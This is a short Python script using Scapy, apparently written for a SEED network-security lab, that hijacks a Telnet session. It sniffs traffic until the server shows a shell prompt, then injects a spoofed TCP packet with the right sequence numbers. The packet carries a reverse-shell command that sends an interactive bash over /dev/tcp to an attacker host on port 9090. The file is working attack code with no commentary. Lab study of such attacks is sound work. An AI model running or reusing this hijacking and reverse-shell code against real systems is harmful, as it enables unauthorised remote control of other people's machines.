#!/usr/bin/python3
from scapy.all import *
# Define IP addresses and MAC addresses
VM_CLIENT_IP = "10.0.2.6"  # Host A's IP client
VM_SERVER_IP = "10.0.2.5"  # Host B's IP server
VM_M_MAC = "08:00:27:46:8a:e7"  # Host M's MAC
command = "/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1\n"
def send_command(sport_number, seq_number, ack_number):
    ip = IP(src=VM_CLIENT_IP, dst=VM_SERVER_IP)
    #flag = ack + psh = 0x018
    tcp = TCP(sport = sport_number, dport=23, flags=0x018, seq=seq_number, ack=ack_number)
    data = command
    pkt = ip/tcp/data
    send(pkt,verbose=1)
    
# Global variable to control sniffing
stop_sniffing = False
stop_sniffing2 = False
def forwarding_pkt(pkt):
    global stop_sniffing
    if pkt[IP].src == VM_SERVER_IP and pkt[IP].dst == VM_CLIENT_IP:
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            test_code = pkt[TCP].payload.load
            if b'(RSD1:server)seed@seed-target1(10.0.2.5):~$ ' in test_code:
                print("Login detected!!!!")
                stop_sniffing = True  # Set the flag to stop sniffing
def spoof_pkt(pkt):
    global stop_sniffing2
    if pkt[IP].src == VM_SERVER_IP and pkt[IP].dst == VM_CLIENT_IP:
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            payload = pkt[TCP].payload.load
            if b'\r\nlogout\r\n' in payload:
                print("Logout detected!!!!")
                stop_sniffing2 = True  # Set the flag to stop sniffing
            elif b'(RSD1:server)seed@seed-target1(10.0.2.5):~$ ' in payload:
                sport_number = pkt[TCP].dport
                seq_number = pkt[TCP].seq
                ack_number = pkt[TCP].ack
                send_command(sport_number,ack_number ,seq_number + len(pkt[TCP].payload))
                stop_sniffing2 = True  # Set the flag to stop sniffing
def stop_condition(pkt):
    return stop_sniffing
def stop_condition2(pkt):
    return stop_sniffing2
# Sniff TCP packets and apply the forwarding_pkt function
print("Waiting for login...")
sniff(filter='tcp', prn=forwarding_pkt, stop_filter=stop_condition)
# Reset the stop_sniffing flag for the second sniff
# After sniffing stops, start another sniff with spoof_pkt
print("Waiting to spoof...")
sniff(filter='tcp', prn=spoof_pkt, stop_filter=stop_condition2)
print("logout...")